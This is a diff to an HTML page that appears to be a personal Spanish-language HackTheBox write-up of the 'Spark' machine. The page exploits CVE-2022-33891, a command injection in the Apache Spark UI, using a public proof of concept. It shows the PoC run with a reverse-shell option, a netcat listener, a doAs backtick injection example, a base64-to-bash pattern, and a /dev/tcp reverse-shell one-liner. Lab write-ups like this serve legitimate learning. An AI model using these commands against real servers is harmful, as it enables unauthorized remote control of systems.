@@ -51,7 +51,7 @@
     .writeup-subtitle{font-family:var(--font-mono);font-size:.85rem;color:var(--text-dim);margin-top:.8rem;letter-spacing:1px;}
     .writeup-meta{display:flex;flex-wrap:wrap;gap:1rem;align-items:center;margin-top:1.8rem;}
     .meta-badge{font-family:var(--font-mono);font-size:.68rem;letter-spacing:2px;padding:.3rem .8rem;border:1px solid;}
-    .badge-vfacil{color:var(--green);border-color:rgba(0,255,136,.4);background:rgba(0,255,136,.05);}
+    .badge-muy-facil{color:var(--green);border-color:rgba(0,255,136,.4);background:rgba(0,255,136,.05);}
     .badge-htb   {color:var(--green);border-color:rgba(0,255,136,.3);background:rgba(0,255,136,.05);}
     .badge-linux {color:var(--yellow);border-color:rgba(255,215,0,.3);background:rgba(255,215,0,.05);}
     .badge-spark {color:var(--orange);border-color:rgba(255,140,0,.4);background:rgba(255,140,0,.05);}
@@ -191,30 +191,31 @@
 <div class="cursor-ring" id="cursorRing"></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">hackthebox</a> /
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
       <span>spark</span>
-    </p>
+    </div>
     <h1 class="writeup-title"><span>Spark</span></h1>
-    <p class="writeup-subtitle">HackTheBox — Linux · CVE-2022-33891 Apache Spark RCE → Reverse Shell → root</p>
+    <p class="writeup-subtitle">HackTheBox — Linux · CVE-2022-33891 Apache Spark RCE → Reverse shell → root</p>
     <div class="writeup-meta">
-      <span class="meta-badge badge-vfacil">● MUY FÁCIL</span>
+      <span class="meta-badge badge-muy-facil">● MUY FÁCIL</span>
       <span class="meta-badge badge-htb">HACKTHEBOX</span>
       <span class="meta-badge badge-linux">LINUX</span>
       <span class="meta-badge badge-spark">APACHE SPARK</span>
       <span class="meta-badge badge-rce">RCE · CVE-2022-33891</span>
-      <span class="meta-date">📅 Mayo 2026 · By Brandeiks</span>
+      <span class="meta-date">📅 Mayo 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -231,7 +232,7 @@
         <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
         <li><a href="#enumeracion">03 · Enumeración Web</a></li>
         <li><a href="#explotacion">04 · Explotación CVE-2022-33891</a></li>
-        <li><a href="#revshell">05 · Reverse Shell</a></li>
+        <li><a href="#revshell">05 · Reverse shell</a></li>
         <li><a href="#flag">06 · Flag</a></li>
         <li><a href="#referencia">07 · Referencia de Comandos</a></li>
         <li><a href="#glosario">08 · Glosario</a></li>
@@ -242,13 +243,13 @@
       <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
       <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux</span></div>
       <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-green">Muy Fácil</span></div>
-      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.228.19</span></div>
+      <div class="info-row"><span class="info-label">IP objetivo</span><span class="info-val" style="color:var(--text)">10.129.228.19</span></div>
       <div class="info-row"><span class="info-label">Puerto Web</span><span class="info-val val-orange">8080 / TCP</span></div>
       <div class="info-row"><span class="info-label">CVE</span><span class="info-val val-red">CVE-2022-33891</span></div>
       <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
     </div>
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>ping</span> → host activo, TTL 63 = Linux</div></div>
         <div class="ap-line"></div>
@@ -289,7 +290,7 @@
         <p>
           La máquina expone Apache Spark versión <span class="hl-red">3.0.3</span> en el puerto
           8080. Esta versión es vulnerable a <span class="hl-red">CVE-2022-33891</span>, una
-          vulnerabilidad de <strong>OS Command Injection</strong> en la interfaz web de Spark UI.
+          vulnerabilidad de <strong>OS Inyección de comandos</strong> en la interfaz web de Spark UI.
           Cuando <code style="color:var(--green)">spark.acls.enable</code> está activado, la función
           de verificación de permisos construye un comando de shell directamente desde la entrada
           del usuario sin sanitización, permitiendo inyección arbitraria de comandos.
@@ -339,7 +340,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ping 10.129.228.19 -c 3">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PING</span>
         <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">10.129.228.19</span> <span class="flag">-c 3</span></span></div>
       </div>
@@ -376,7 +377,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.228.19 -oX spark.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">10.129.228.19</span> <span class="flag">-oX</span> <span class="arg">spark.xml</span></span></div>
       </div>
@@ -438,7 +439,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl spark.xml > spark.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">XSLTPROC</span>
         <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">spark.xml</span> &gt; <span class="arg">spark.html</span></span></div>
       </div>
@@ -467,7 +468,7 @@
           La página revela <span class="hl-red">Apache Spark 3.0.3</span>. Con este dato
           buscamos vulnerabilidades conocidas para esta versión específica y encontramos
           <span class="hl-red">CVE-2022-33891</span>: una vulnerabilidad de
-          <strong>OS Command Injection</strong> que afecta a Apache Spark hasta la versión
+          <strong>OS Inyección de comandos</strong> que afecta a Apache Spark hasta la versión
           3.0.3 (y ramas 3.1.x hasta 3.1.2, 3.2.x hasta 3.2.1).
         </p>
       </div>
@@ -482,7 +483,7 @@
         <p>
           <strong>Versiones afectadas:</strong> Apache Spark ≤ 3.0.3, 3.1.x ≤ 3.1.2, 3.2.x ≤ 3.2.1<br>
           <strong>Componente:</strong> Spark UI con <code>spark.acls.enable=true</code><br>
-          <strong>Tipo:</strong> OS Command Injection (CWE-78)<br>
+          <strong>Tipo:</strong> OS Inyección de comandos (CWE-78)<br>
           <strong>Impacto:</strong> RCE como el usuario que ejecuta Spark (en este caso, root)<br>
           <strong>Vector:</strong> La función de verificación de ACLs construye un comando shell usando directamente el parámetro <code>doAs</code> de la URL sin sanitización. Un atacante puede inyectar comandos arbitrarios a través de este parámetro.<br>
           <strong>CVSS:</strong> 8.8 (Alto) — explotable remotamente sin autenticación previa.
@@ -513,7 +514,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="git clone https://github.com/HuskyHacks/cve-2022-33891.git">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">GIT</span>
         <div><span class="prompt">$ </span><span class="cmd">git clone <span class="arg">https://github.com/HuskyHacks/cve-2022-33891.git</span></span></div>
       </div>
@@ -542,7 +543,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="cd cve-2022-33891 && python3 -m venv venv && source venv/bin/activate && pip install -r requirements.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">VENV</span>
         <div><span class="prompt">$ </span><span class="cmd">cd <span class="arg">cve-2022-33891</span></span></div>
         <div><span class="prompt">$ </span><span class="cmd">python3 <span class="flag">-m venv</span> <span class="arg">venv</span></span></div>
@@ -578,7 +579,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="python3 poc.py -u http://10.129.228.19 -p 8080 --check --verbose">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">POC</span>
         <div><span class="prompt-venv">(venv) $ </span><span class="cmd">python3 poc.py <span class="flag">-u</span> <span class="arg">http://10.129.228.19</span> <span class="flag">-p</span> <span class="arg">8080</span> <span class="flag">--check</span> <span class="flag">--verbose</span></span></div>
       </div>
@@ -618,7 +619,7 @@
     <!-- REVERSE SHELL -->
     <div class="section" id="revshell">
       <p class="section-label">// 05</p>
-      <h2 class="section-title">Reverse Shell</h2>
+      <h2 class="section-title">Reverse shell</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -641,7 +642,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nc -lvnp 443">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NETCAT</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nc <span class="flag">-lvnp</span> <span class="arg">443</span></span></div>
       </div>
@@ -683,7 +684,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="python3 poc.py -u http://10.129.228.19 -p 8080 --revshell -lh 10.10.16.5 -lp 443 --verbose">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">REVSHELL</span>
         <div><span class="prompt-venv">(venv) $ </span><span class="cmd">python3 poc.py <span class="flag">-u</span> <span class="arg">http://10.129.228.19</span> <span class="flag">-p</span> <span class="arg">8080</span> <span class="flag">--revshell</span> <span class="flag">-lh</span> <span class="arg">10.10.16.5</span> <span class="flag">-lp</span> <span class="arg">443</span> <span class="flag">--verbose</span></span></div>
       </div>
@@ -866,17 +867,17 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">CVE-2022-33891 — OS Command Injection en Spark UI</div>
+          <div class="glos-term">CVE-2022-33891 — OS Inyección de comandos en Spark UI</div>
           <div class="glos-def"><strong>CVE-2022-33891</strong> es una vulnerabilidad de inyección de comandos OS (CWE-78) en la interfaz web de Apache Spark (versiones ≤ 3.0.3, ≤ 3.1.2, ≤ 3.2.1). Cuando <code>spark.acls.enable=true</code>, la función <code>checkUIViewPermissions</code> construye un comando shell usando directamente el parámetro <code>doAs</code> de la URL sin sanitización. El parámetro se pasa como argumento al binario de verificación de permisos, pero al estar sin escapar, un atacante puede usar backticks (`` ` ``) para inyectar comandos arbitrarios. El servidor ejecuta el payload en el contexto del proceso Spark. Publicado el 5 de julio de 2022 por Kostya Kortchinsky. Parcheado en Spark 3.0.4, 3.1.3, 3.2.2 y 3.3.0.</div>
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">OS Command Injection (CWE-78)</div>
-          <div class="glos-def"><strong>OS Command Injection</strong> ocurre cuando una aplicación construye comandos del sistema operativo usando datos controlados por el atacante sin sanitización adecuada. El atacante puede incluir metacaracteres de shell (<code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, `` ` ``) para encadenar comandos adicionales. En CVE-2022-33891, la inyección se realiza con backticks en el parámetro <code>doAs</code>: la URL <code>/?doAs=`comando`</code> hace que el shell evalúe el contenido entre backticks antes de pasarlo como argumento al binario de verificación. Para evadir WAFs y caracteres especiales, el PoC codifica el payload en <strong>Base64</strong> y lo decodifica en tiempo de ejecución: <code>echo [base64] | base64 -d | bash</code>.</div>
+          <div class="glos-term">OS Inyección de comandos (CWE-78)</div>
+          <div class="glos-def"><strong>OS Inyección de comandos</strong> ocurre cuando una aplicación construye comandos del sistema operativo usando datos controlados por el atacante sin sanitización adecuada. El atacante puede incluir metacaracteres de shell (<code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, `` ` ``) para encadenar comandos adicionales. En CVE-2022-33891, la inyección se realiza con backticks en el parámetro <code>doAs</code>: la URL <code>/?doAs=`comando`</code> hace que el shell evalúe el contenido entre backticks antes de pasarlo como argumento al binario de verificación. Para evadir WAFs y caracteres especiales, el PoC codifica el payload en <strong>Base64</strong> y lo decodifica en tiempo de ejecución: <code>echo [base64] | base64 -d | bash</code>.</div>
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Reverse Shell — Conexión Inversa</div>
+          <div class="glos-term">Reverse shell — Conexión Inversa</div>
           <div class="glos-def">Una <strong>reverse shell</strong> es una técnica donde la máquina víctima inicia la conexión hacia el atacante (en lugar del esquema habitual donde el atacante se conecta a la víctima). Esto es necesario porque los firewalls suelen bloquear conexiones entrantes al servidor pero permiten las salientes. El flujo es: (1) el atacante abre un listener con <code>nc -lvnp [puerto]</code>; (2) se inyecta el payload en el servidor (<code>sh -i >& /dev/tcp/[IP]/[PORT] 0>&1</code>); (3) el servidor abre una conexión TCP hacia el atacante y redirige su stdin/stdout/stderr a esa conexión; (4) el atacante recibe la shell. El uso del puerto 443 imita tráfico HTTPS saliente, reduciendo la probabilidad de que el firewall lo bloquee.</div>
         </div>
 
@@ -902,9 +903,9 @@
 </div>
 
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Spark · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // TOC ACTIVE
